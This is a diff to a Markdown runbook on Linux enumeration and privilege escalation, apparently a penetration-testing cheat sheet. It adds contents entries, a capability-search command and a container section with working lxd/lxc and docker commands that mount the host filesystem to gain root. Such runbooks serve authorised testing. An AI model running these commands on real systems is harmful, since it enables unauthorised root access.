@@ -34,6 +34,12 @@ This runbook is to help with Linux enumeration and Privilege Escalation.  It inc
     - [Path Abuse](#path-abuse)
     - [Wildcard Abuse](#wildcard-abuse)
     - [Escaping Restricted Shells](#escaping-restricted-shells)
+  - [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
+    - [Privileged Groups](#privileged-groups)
+      - [Containers](#containers)
+  - [Service-based Privilege Escalation](#service-based-privilege-escalation)
+  - [Linux Internals-based Privilege Escalation](#linux-internals-based-privilege-escalation)
+  - [Recent 0-Days](#recent-0-days)
   - [Establish tunnel](#establish-tunnel)
   - [Establish persistance](#establish-persistance)
   - [Automated Tools](#automated-tools)
@@ -313,6 +319,7 @@ dpkg -l; apt list installed;
 getcap -r / 2>/dev/null
 find / -type f \ ( -name *.conf -o -name *.config \ ) -exec ls -l { } \ ; 2 > /dev/null
 find / -type f -name "*.sh" 2 > /dev/null | grep -v "src\|snap\|share"
+ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 ```
 
 - GTFObins
@@ -349,6 +356,23 @@ Creating a script or program in a directory specified in the PATH will make it e
 ### Escaping Restricted Shells
 
 ## Permissions-based Privilege Escalation
+
+### Privileged Groups
+
+#### Containers
+
+```bash
+# Ubuntu  containers
+lxd init
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+lxc exec r00t /bin/sh
+# Docker
+docker run -v /root:/mnt -it ubuntu
+
+```
 
 ## Service-based Privilege Escalation
 
